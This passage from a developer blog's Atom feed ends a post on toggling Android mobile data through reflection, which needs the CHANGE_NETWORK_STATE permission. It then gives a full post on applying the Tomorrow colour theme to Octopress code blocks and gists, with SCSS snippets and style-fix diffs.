</span><span class='line'>    <span class="kd">final</span> <span class="n">Method</span> <span class="n">setMobileDataEnabledMethod</span> <span class="o">=</span> <span class="n">iConnectivityManagerClass</span>
</span><span class='line'>        <span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&quot;setMobileDataEnabled&quot;</span><span class="o">,</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">TYPE</span><span class="o">);</span>
</span><span class='line'>    <span class="n">setMobileDataEnabledMethod</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">setMobileDataEnabledMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">iConnectivityManager</span><span class="o">,</span> <span class="n">enabled</span><span class="o">);</span>
</span><span class='line'>  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span><span class='line'>  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InvocationTargetException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span><span class='line'>  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchMethodException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span><span class='line'>  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span><span class='line'>  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>It requires to <code>CHANGE_NETWORK_STATE</code> permission.</p>

<figure class='code'><figcaption><span>AndroidManifest.xml</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&quot;android.permission.CHANGE_NETWORK_STATE&quot;</span> <span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>In Activity:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">setMobileDataEnabled</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">isMobileDataEnabled</span><span class="o">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Codes for Android 2.2 and below are also in the same <a href="http://stackoverflow.com/questions/12535101/how-can-i-turn-off-3g-data-programmatically-on-android#12535246">answer</a>, but it requires <code>MODIFY_PHONE_STATE</code> permission that can be used by <a href="http://developer.android.com/reference/android/Manifest.permission.html#MODIFY_PHONE_STATE">system applications only</a>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Tomorrow Theme in Octopress]]></title>
    <link href="http://yous.be/2013/12/04/tomorrow-theme-in-octopress/"/>
    <updated>2013-12-04T21:00:20+09:00</updated>
    <id>http://yous.be/2013/12/04/tomorrow-theme-in-octopress</id>
    <content type="html"><![CDATA[<h2><a id="tomorrow-theme"></a>Tomorrow Theme</h2>

<p>I usually use Tomorrow Night Eighties of <a href="https://github.com/chriskempson/tomorrow-theme">Tomorrow Theme</a> in <a href="http://www.vim.org">Vim</a>, <a href="http://www.iterm2.com">iTerm2</a>, <a href="http://www.jetbrains.com/idea/">IntelliJ IDEA</a> (<a href="http://developer.android.com/sdk/installing/studio.html">Android Studio</a>). You can take a look of Tomorrow Theme.</p>

<p><img src="https://github.com/ChrisKempson/Tomorrow-Theme/raw/master/Images/Tomorrow-Night.png" title="Tomorrow Night" >
<img src="https://github.com/ChrisKempson/Tomorrow-Theme/raw/master/Images/Tomorrow.png" title="Tomorrow" >
<img src="https://github.com/ChrisKempson/Tomorrow-Theme/raw/master/Images/Tomorrow-Night-Eighties.png" title="Tomorrow Night Eighties" >
<img src="https://github.com/ChrisKempson/Tomorrow-Theme/raw/master/Images/Tomorrow-Night-Blue.png" title="Tomorrow Night Blue" >
<img src="https://github.com/ChrisKempson/Tomorrow-Theme/raw/master/Images/Tomorrow-Night-Bright.png" title="Tomorrow Night Bright" ></p>

<p>So I made scss files for Octopress that overrides colors of <code>.highlight</code> and <code>.gist</code> class elements. Usual code blocks and embedded gists are properly highlighted. The <a href="http://yous.be/2013/12/03/syntax-highlighting-test/">demo</a> and the <a href="https://github.com/yous/yous.github.io/tree/source/sass/custom">code</a> are available.</p>

<!-- more -->


<h2><a id="usage"></a>Usage</h2>

<ol>
<li>Download <code>tomorrow</code> folder and <code>_tomorrow.scss</code> from <a href="https://github.com/yous/yous.github.io/tree/source/sass/custom">GitHub</a>.</li>
<li>Put files to <code>sass/custom</code> and enable just one <code>@import</code> line of <code>_tomorrow.scss</code>. For example, if you want to use Tomorrow Night Eighties theme:</li>
</ol>


<figure class='code'><figcaption><span>sass/custom/_tomorrow.scss</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='scss'><span class='line'><span class="c1">// @import &quot;tomorrow/tomorrow-night&quot;;</span>
</span><span class='line'><span class="c1">// @import &quot;tomorrow/tomorrow&quot;;</span>
</span><span class='line'><span class="k">@import</span> <span class="s2">&quot;tomorrow/tomorrow-night-eighties&quot;</span><span class="p">;</span>
</span><span class='line'><span class="c1">// @import &quot;tomorrow/tomorrow-night-blue&quot;;</span>
</span><span class='line'><span class="c1">// @import &quot;tomorrow/tomorrow-night-bright&quot;;</span>
</span></code></pre></td></tr></table></div></figure>


<h2><a id="fixes"></a>Fixes</h2>

<ul>
<li>With default <code>sass/partial/_syntax.scss</code>, embedded gist code looks <a href="http://devspade.com/blog/2013/08/06/fixing-gist-embeds-in-octopress/">weird</a>. To fix them, we should override some styles.</li>
</ul>


<div><script src='https://gist.github.com/8474011.js'></script>
<noscript><pre><code>@@ -1,10 +1,10 @@
 .highlight, html .gist .gist-file .gist-syntax .gist-highlight {
-  table td.code { width: 100%; }
+  table td.code, td.line-data { width: 100%; }
   border: 1px solid $pre-border !important;
 }
 .highlight .line-numbers, html .gist .gist-file .gist-syntax .highlight .line_numbers {
   text-align: right;
-  font-size: 13px;
+  font-size: 13px !important;
   line-height: 1.45em;
   @if $solarized == light {
     background: lighten($base03, 1) $noise-bg !important;
@@ -69,7 +69,7 @@ html .gist .gist-file {
       &amp;:hover { color: $base1 !important; }
     }
     a[href*=&#39;#file&#39;] {
-      position: absolute; top: 0; left:0; right:-10px;
+      position: absolute; top: 0; left:0; right:0;
       color: #474747 !important;
       @extend .code-title;
       &amp;:hover { color: $link-color !important; }</code></pre></noscript></div>


<ul>
<li>Default <code>sass/partial/_syntax.scss</code> adds <code>box-shadow</code> and <code>text-shadow</code> to line numbers, also <code>box-shadow</code> to code block and gist. I removed these attributes and it is just can be done by overriding style in <code>sass/custom/_styles.scss</code>.</li>
</ul>


<figure class='code'><figcaption><span>sass/custom/_styles.scss</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='scss'><span class='line'><span class="nc">.highlight</span> <span class="nc">.line-numbers</span><span class="o">,</span> <span class="nt">html</span> <span class="nc">.gist</span> <span class="nc">.gist-file</span> <span class="nc">.gist-syntax</span> <span class="nc">.highlight</span> <span class="nc">.line_numbers</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">@include</span><span class="nd"> box-shadow</span><span class="p">(</span><span class="no">none</span><span class="p">);</span>
</span><span class='line'>  <span class="na">text-shadow</span><span class="o">:</span> <span class="no">none</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nt">figure</span><span class="nc">.code</span><span class="o">,</span> <span class="nc">.gist-file</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">@include</span><span class="nd"> box-shadow</span><span class="p">(</span><span class="no">none</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>This issue was fixed by this <a href="https://github.com/lucaslew/whitespace/commit/b047f268c804808fb8e2d6a17cbfe8669b9da6b4">commit</a>.</strong> This blog uses <a href="https://github.com/lucaslew/whitespace">Whitespace</a> theme. I found some problems that it overrides colors of code block to dark blue and it hides line numbers. To fix these problems, remove lines in <code>sass/custom/_styles.scss</code>.</li>
</ul>


<div><script src='https://gist.github.com/7795229.js'></script>
<noscript><pre><code>@@ -166,20 +166,6 @@ article {
   
 }
 
-figure.code {
-  .highlight {
-    background: #212C3B !important;
-
-    .gutter {
-      display: none;
-    }
-  }
-}
-
-.pre-code, html .gist .gist-file .gist-syntax .highlight pre, .highlight code {
-  background: #212C3B !important;
-}
-
 aside {
   display: none;
 }</code></pre></noscript></div>



]]></content>
  </entry>
  
</feed>
